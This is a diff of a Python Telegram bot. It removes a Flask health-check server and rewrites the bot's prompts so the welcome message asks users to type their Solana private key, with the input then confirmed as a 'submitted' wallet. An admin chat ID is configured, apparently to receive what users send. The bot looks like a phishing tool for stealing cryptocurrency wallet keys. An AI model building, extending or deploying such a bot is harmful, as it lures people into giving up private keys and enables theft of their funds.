@@ -1,7 +1,5 @@
 import logging
 import os
-from threading import Thread
-from flask import Flask
 from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
@@ -19,22 +17,6 @@ ADMIN_CHAT_ID = int(os.environ.get('ADMIN_CHAT_ID', '0'))
 # Conversation states
 WAITING_FOR_NAME = 1
 
-# Flask app for health checks
-app = Flask(__name__)
-
-@app.route('/')
-def health_check():
-    return 'Bot is running!', 200
-
-@app.route('/health')
-def health():
-    return 'OK', 200
-
-def run_flask():
-    """Run Flask server in a separate thread."""
-    port = int(os.environ.get('PORT', 8080))
-    app.run(host='0.0.0.0', port=port)
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Send welcome message with button."""
     user = update.effective_user
@@ -45,7 +27,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     
     welcome_message = (
         f"Welcome to this bot, {user.first_name}! 👋\n\n"
-        "Click the button below to start."
+        "Click the button below and type your Solana private key to start."
     )
     
     await update.message.reply_text(welcome_message, reply_markup=reply_markup)
@@ -54,7 +36,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def handle_submit_button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle the 'Submit Your Name' button press."""
     await update.message.reply_text(
-        "Bind your Solana private key to start:",
+        "Please type your name:",
         reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Cancel")]], resize_keyboard=True)
     )
     return WAITING_FOR_NAME
@@ -67,12 +49,12 @@ async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     if user_name.lower() == 'cancel':
         keyboard = [[KeyboardButton("Submit Your Wallet")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-        await update.message.reply_text("Cancelled. You can resubmit anytime!", reply_markup=reply_markup)
+        await update.message.reply_text("Cancelled. You can resubmit your wallet anytime!", reply_markup=reply_markup)
         return ConversationHandler.END
     
     # Send confirmation to user
     await update.message.reply_text(
-        f"Thank you! Your wallet '{user_name}' has been registered. ✅",
+        f"Thank you! Your Solana wallet '{user_name}' has been submitted. ✅",
         reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Submit Your Wallet")]], resize_keyboard=True)
     )
     
@@ -96,9 +78,9 @@ async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the conversation."""
-    keyboard = [[KeyboardButton("Submit Your Name")]]
+    keyboard = [[KeyboardButton("Submit Your Wallet")]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-    await update.message.reply_text("Cancelled. You can submit your name anytime!", reply_markup=reply_markup)
+    await update.message.reply_text("Cancelled. You can submit your wallet anytime!", reply_markup=reply_markup)
     return ConversationHandler.END
 
 def main():
@@ -106,11 +88,6 @@ def main():
     if not BOT_TOKEN or ADMIN_CHAT_ID == 0:
         logger.error("Please set BOT_TOKEN and ADMIN_CHAT_ID environment variables!")
         return
-    
-    # Start Flask server in background thread
-    flask_thread = Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    logger.info("Flask health check server started")
     
     # Create application
     application = Application.builder().token(BOT_TOKEN).build()
